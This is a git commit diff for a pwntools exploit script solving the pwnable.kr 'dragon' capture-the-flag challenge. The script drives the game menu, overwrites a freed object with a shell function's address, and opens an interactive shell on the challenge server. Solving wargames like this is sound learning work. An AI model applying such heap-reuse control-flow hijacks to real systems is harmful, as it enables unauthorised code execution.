03121b979d3bd8d34da0c560061ceb28b3bb93cd
zeredy879 <903796007@qq.com>
2022-06-27 11:22:12 +0800

    dragon wp

--- pwnable_kr/dragon/sol.py
+++ pwnable_kr/dragon/sol.py
@@ -1,10 +1,20 @@
 from pwn import *
 
-r = process("./dragon")
+context.log_level = "debug"
+shell_addr = 0x8048dbf
+
+r = remote("pwnable.kr", 9004)
+# r = process("./dragon")
 
 r.recvuntil(b"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight\n")
 r.sendline(b"2")
 r.sendline(b"2")
 r.recvuntil(b"Choose Your Hero\n[ 1 ] Priest\n[ 2 ] Knight\n")
-
-r.recvuntil(b"Baby Dragon Has Appeared!\n")
+r.sendline(b"1")
+for _ in range(4):
+    r.sendline(b"3")
+    r.sendline(b"3")
+    r.sendline(b"2")
+r.recvuntil("The World Will Remember You As:\n")
+r.sendline(p32(shell_addr))
+r.interactive()
